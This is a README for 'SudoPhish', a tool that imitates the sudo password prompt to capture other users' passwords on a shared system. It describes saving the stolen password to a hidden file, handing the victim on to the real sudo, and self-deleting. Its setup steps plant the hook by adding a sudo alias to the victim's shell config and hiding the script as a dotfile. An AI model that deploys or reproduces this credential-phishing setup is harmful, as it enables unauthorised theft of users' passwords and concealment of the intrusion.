# SudoPhish
A short self-destructive script to phish the passwords of the users on your system.

# What it does
+ It pretends to be the Sudo password prompt and asks the victim for their password
+ Saves the password in a text file ( ~/.pwd )
+ Redirects the user to real sudo
+ Self-destructs

# How to set up manually
+ Move everything to the home directory of the user if it isn't there already
+ Make sure you edit the shabang according to the users interactive SH. If they use bash, make sure the script starts with #!/bin/bash , if they use zsh, then make sure it starts with #!/bin/zsh etc. It does not work with fish. Default is bash.
+ Set the $shellfile variable accordingly (line 21). Default is .bashrc
+ Put the following line at the END of the Shell config file: ``` alias sudo=".sp.sh; sudo"
+ Rename the file .sp.sh
